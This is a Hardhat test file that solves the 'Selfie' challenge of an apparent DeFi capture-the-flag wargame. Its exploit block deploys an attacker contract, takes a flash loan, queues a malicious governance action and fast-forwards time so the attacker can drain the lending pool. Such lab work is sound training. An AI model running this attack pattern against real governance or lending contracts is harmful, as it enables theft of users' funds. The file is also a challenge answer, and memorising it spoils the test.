const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Selfie", function () {
  let deployer, attacker;

  const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther("2000000"); // 2 million tokens
  const TOKENS_IN_POOL = ethers.utils.parseEther("1500000"); // 1.5 million tokens

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory(
      "DamnValuableTokenSnapshot",
      deployer
    );
    const SimpleGovernanceFactory = await ethers.getContractFactory(
      "SimpleGovernance",
      deployer
    );
    const SelfiePoolFactory = await ethers.getContractFactory(
      "SelfiePool",
      deployer
    );

    this.token = await DamnValuableTokenSnapshotFactory.deploy(
      TOKEN_INITIAL_SUPPLY
    );
    this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
    this.pool = await SelfiePoolFactory.deploy(
      this.token.address,
      this.governance.address
    );

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

    expect(await this.token.balanceOf(this.pool.address)).to.be.equal(
      TOKENS_IN_POOL
    );
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */

    // DETAILED EXPLANATION OF THE SOLUTION IS IN 'SelfieDrainFunds' smart contract

    // Deploying attacker contract
    const DrainFundsFactory = await ethers.getContractFactory(
      "SelfieDrainFunds"
    );
    const drainFunds = await DrainFundsFactory.deploy();

    // Exectuing attack function
    await drainFunds
      .connect(attacker)
      .executeFlashloan(this.pool.address, this.governance.address);

    // Quering actionId of our malicious proposal
    let actionId = await drainFunds.actionId();

    // Increasing time by 2 days cause action can only be executed after 2 days has been passed since it's proposal
    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
    await this.governance.connect(attacker).executeAction(actionId);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(attacker.address)).to.be.equal(
      TOKENS_IN_POOL
    );
    expect(await this.token.balanceOf(this.pool.address)).to.be.equal("0");
  });
});
